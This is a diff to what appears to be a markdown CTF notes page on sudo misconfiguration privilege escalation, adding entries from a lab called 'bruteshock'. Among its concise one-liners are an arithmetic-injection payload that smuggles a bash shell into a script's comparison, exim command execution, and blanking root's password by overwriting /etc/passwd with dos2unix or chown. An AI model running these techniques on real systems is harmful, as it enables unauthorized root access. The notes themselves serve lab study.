@@ -29,7 +29,10 @@ Exploiting misconfigured `sudo` permissions to escalate privileges.
 - `(pingu) NOPASSWD: /usr/bin/man` → `sudo -u pingu man man`, then `!/bin/bash` inside the pager → shell as `pingu` ([[anonymous-pingu]]).
 - `(gladys) NOPASSWD: /usr/bin/nmap` → `nmap --script=/tmp/shell.nse` with `os.execute("/bin/sh <&1 >&1 2>&1")` → shell as `gladys` ([[anonymous-pingu]]).
 - `(root) NOPASSWD: /usr/bin/chown` → take ownership of `/etc/passwd`, blank root's password → `su -` ([[anonymous-pingu]], see [[writable-etc-passwd]]).
+- `(maci) NOPASSWD: /home/maci/script.sh` → script uses `[[ $num -eq 123123 ]]` → arithmetic injection `a[$(/bin/bash -p >&2)]` → shell as `maci` ([[bruteshock]], [[arithmetic-injection]]).
+- `(pepe) NOPASSWD: /usr/sbin/exim` → `exim -be '${run{…}}'` runs commands as pepe ([[bruteshock]], [[exim-lpe]]).
+- `(ALL) NOPASSWD: /usr/bin/dos2unix` → `dos2unix -f -n /tmp/passwd.new /etc/passwd` blanks root's password → `su -` ([[bruteshock]], [[writable-etc-passwd]]).
 
 ## Seen in
 
-[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]]
+[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]]
